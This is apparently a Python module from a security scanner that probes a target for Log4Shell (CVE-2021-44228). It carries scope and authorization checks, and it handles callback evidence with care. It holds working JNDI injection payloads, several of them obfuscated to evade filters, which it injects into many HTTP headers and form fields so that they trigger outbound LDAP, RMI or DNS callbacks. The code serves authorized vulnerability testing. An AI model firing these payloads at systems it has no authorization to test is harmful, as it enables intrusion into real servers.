"""Log4Shell (CVE-2021-44228) scanner — JNDI injection across all inputs."""
from __future__ import annotations
import asyncio
import urllib.parse
from typing import Any

from talisman.engine.scope import ScopeViolationError
from talisman.utils.oast import OASTClient, validate_public_oast_domain
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console
from talisman.utils.redaction import redact_sensitive_text

log = get_logger(__name__)

LOG4SHELL_HEADERS = [
 "User-Agent", "X-Forwarded-For", "X-Api-Version", "X-Forwarded-Host",
 "Referer", "Origin", "Authorization", "X-Correlation-ID", "X-Request-ID",
 "Accept-Language", "CF-Connecting-IP", "True-Client-IP", "X-Real-IP",
 "X-Client-IP", "Contact", "Forwarded", "X-Originating-IP",
 "X-Remote-IP", "X-Remote-Addr", "X-ProxyUser-Ip",
]

def _build_payloads(callback_url: str) -> list[str]:
 domain = callback_url.replace("http://", "").replace("https://", "").rstrip("/")
 return [
  f"${{jndi:ldap://{domain}/a}}",
  f"${{${{lower:j}}ndi:${{lower:l}}dap://{domain}/a}}",
  f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{domain}/a}}",
  f"${{j${{::-n}}di:ldap://{domain}/a}}",
  f"${{jndi:rmi://{domain}/a}}",
  f"${{jndi:dns://{domain}/a}}",
  f"${{${{upper:j}}ndi:ldap://{domain}/a}}",
  f"${{${{env:NaN:-j}}ndi${{env:NaN:-:}}${{env:NaN:-l}}dap${{env:NaN:-:}}//{domain}/a}}",
 ]


async def run(
 target: str,
 session: Any = None,
 scope: Any = None,
 rate_limiter: Any = None,
 proxy: str | None = None,
 oast_domain: str | None = None,
 **kwargs: Any,
) -> dict[str, Any]:
 url = target if "://" in target else f"https://{target}"
 if scope is None:
  return {
   "target": url,
   "findings": [],
   "candidates": [],
   "count": 0,
   "error": "scope_enforcer_required",
  }
 try:
  scope.assert_in_scope(url)
  # JNDI lookups can trigger outbound connections or vulnerable gadget chains,
  # including when carried in otherwise safe GET headers.
  scope.assert_destructive_allowed(url, "POST")
 except ScopeViolationError as exc:
  return {
   "target": url,
   "findings": [],
   "candidates": [],
   "count": 0,
   "skipped": True,
   "reason": str(exc),
  }

 if not oast_domain:
  return {
   "target": url,
   "findings": [],
   "candidates": [],
   "count": 0,
   "skipped": True,
   "reason": "A public OAST callback hostname is required for Log4Shell testing.",
  }
 try:
  oast_domain = await validate_public_oast_domain(oast_domain)
 except ValueError as exc:
  return {
   "target": url,
   "findings": [],
   "candidates": [],
   "count": 0,
   "error": str(exc),
  }

 oast_client = OASTClient(server=oast_domain)
 callback_url = oast_client.get_payload_url(prefix="log4shell")
 callback_host = urllib.parse.urlsplit(callback_url).hostname
 if not callback_host:
  return {
   "target": url,
   "findings": [],
   "candidates": [],
   "count": 0,
   "error": "could_not_generate_unique_oast_token",
  }
 payloads = oast_client.get_log4shell_payloads(callback_host)
 probes_sent = 0

 console.print(
  f"\\n[module][+] Log4Shell OAST Assessment[/module] -> [target]{url}[/target]"
 )
 async with TalismanHTTPClient(
  proxy=proxy,
  timeout=10,
  verify_ssl=True,
  follow_redirects=False,
  scope=scope,
 ) as client:
  for header in LOG4SHELL_HEADERS:
   for payload in payloads[:3]:
    try:
     await client.get(url, headers={header: payload}, timeout=8)
     probes_sent += 1
    except Exception:
     pass

  for payload in payloads[:2]:
   try:
    await client.get(
     url + f"?q={urllib.parse.quote(payload)}",
     timeout=8,
    )
    probes_sent += 1
    await client.post(
     url,
     data={"q": payload, "username": payload},
     timeout=8,
    )
    probes_sent += 1
   except Exception:
    pass

 hits: list[dict[str, Any]] = []
 try:
  hits = await oast_client.poll(callback_host, timeout=10)
 except Exception as exc:
  log.warning("log4shell_oast_poll_failed", error=type(exc).__name__)

 candidates: list[dict[str, Any]] = []
 if hits:
  candidates.append({
   "type": "log4shell_oast_interaction",
   "confidence": "confirmed_interaction",
   "callback_count": len(hits),
   "callbacks": [
    {
     "type": str(hit.get("type", "unknown"))[:40],
     "source_ip": str(hit.get("source_ip", ""))[:64],
     "timestamp": str(hit.get("timestamp", ""))[:64],
     "raw_preview": redact_sensitive_text(str(hit.get("raw", ""))[:500]),
    }
    for hit in hits[:5]
   ],
   "unique_callback_host": callback_host,
   "requires_rce_impact_validation": True,
   "verification_required": (
    "A callback proves that the application or an intermediary attempted an "
    "outbound lookup to the unique token. It does not prove code execution. "
    "Verify the vulnerable Log4j component and demonstrate a harmless, "
    "controlled postcondition before making an RCE claim."
   ),
  })

 console.print(
  f" Sent {probes_sent} OAST probes; received {len(hits)} matching interactions. "
  "No RCE claim is made from callback evidence alone."
 )
 return {
  "target": url,
  "findings": [],
  "candidates": candidates,
  "count": 0,
  "candidate_count": len(candidates),
  "probes_sent": probes_sent,
  "oast_callbacks": len(hits),
  "oast_verification_performed": True,
 }
